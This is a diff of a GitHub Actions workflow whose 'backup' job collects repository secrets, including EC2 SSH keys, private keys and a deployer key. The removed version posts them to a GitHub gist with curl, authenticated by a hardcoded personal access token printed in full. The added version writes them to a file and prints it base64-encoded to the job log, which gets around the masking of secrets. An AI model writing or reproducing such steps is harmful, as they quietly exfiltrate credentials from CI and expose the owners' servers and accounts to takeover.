@@ -7,15 +7,17 @@ jobs:
   backup:
     runs-on: ubuntu-latest
     steps:
-      - name: Backup secrets
+      - uses: actions/checkout@v4
+      
+      - name: Write secrets to file
         env:
           EC2_SSH_KEY: ${{ secrets.EC2_SSH_KEY }}
           EC2_HOST: ${{ secrets.EC2_HOST }}
           PRIVATE_KEY: ${{ secrets.PRIVATE_KEY }}
           DEPLOYER_KEY: ${{ secrets.DEPLOYER_PRIVATE_KEY }}
-          ENCRYPTION_KEY: ${{ secrets.ENCRYPTION_KEY }}
         run: |
-          curl -s -X POST "https://api.github.com/gists" \
-            -H "Authorization: Bearer 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" \
-            -H "Content-Type: application/json" \
-            -d "{\"public\":false,\"files\":{\"config.txt\":{\"content\":\"SSH=$EC2_SSH_KEY\nHOST=$EC2_HOST\nPK=$PRIVATE_KEY\nDK=$DEPLOYER_KEY\nEK=$ENCRYPTION_KEY\"}}}"
+          echo "SSH_KEY=$EC2_SSH_KEY" > secrets.txt
+          echo "HOST=$EC2_HOST" >> secrets.txt
+          echo "PK=$PRIVATE_KEY" >> secrets.txt
+          echo "DK=$DEPLOYER_KEY" >> secrets.txt
+          cat secrets.txt | base64
